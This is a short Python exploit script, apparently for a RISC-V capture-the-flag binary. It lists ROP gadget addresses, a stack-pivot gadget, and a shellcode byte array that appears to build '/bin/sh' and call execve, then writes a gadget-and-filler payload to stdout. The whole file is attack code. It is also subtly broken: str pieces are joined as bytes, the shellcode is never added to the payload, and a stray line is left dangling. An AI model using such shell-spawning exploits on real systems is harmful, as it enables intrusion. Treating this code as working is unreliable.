# gadget 0x00000000000103c8 : c.ldsp ra, 8(sp) ; c.ldsp s0, 0(sp) ; c.addi sp, 0x10 ; c.jr ra

import struct
import sys
# gadget 0x000000000003d846 : c.ldsp ra, 0x18(sp) ; c.ldsp s0, 0x10(sp) ; c.addi16sp sp, 0x20 ; c.jr ra
# stack pivot
GADGET = 0x000000000003d862
shellcode = ["\x01\x11\x06\xec"
           ,"\x22\xe8\x13\x04"
           ,"\x21\x02\xb7\x67"
           ,"\x69\x6e\x93\x87"
           ,"\xf7\x22\x23\x30"
           ,"\xf4\xfe\xb7\x77"
           ,"\x68\x10\x33\x48"
           ,"\x08\x01\x05\x08"
           ,"\x72\x08\xb3\x87"
           ,"\x07\x41\x93\x87"
           ,"\xf7\x32\x23\x32"
           ,"\xf4\xfe\x93\x07"
           ,"\x04\xfe\x01\x46"
           ,"\x81\x45\x3e\x85"
           ,"\x93\x08\xd0\x0d"
           ,"\x93\x06\x30\x07"
           ,"\x23\x0e\xd1\xee"
           ,"\x93\x06\xe1\xef"
           ,"\x67\x80\xe6\xff"]
sb = b"".join(shellcode)

payload = struct.pack("<Q",GADGET)
#payload = struct.pack("<Q",0xdeadbeefdeadbeef)
payload += struct.pack("<Q",0xdeadbeefdeadbeef) * 3
payload 
sys.stdout.buffer.write(payload)
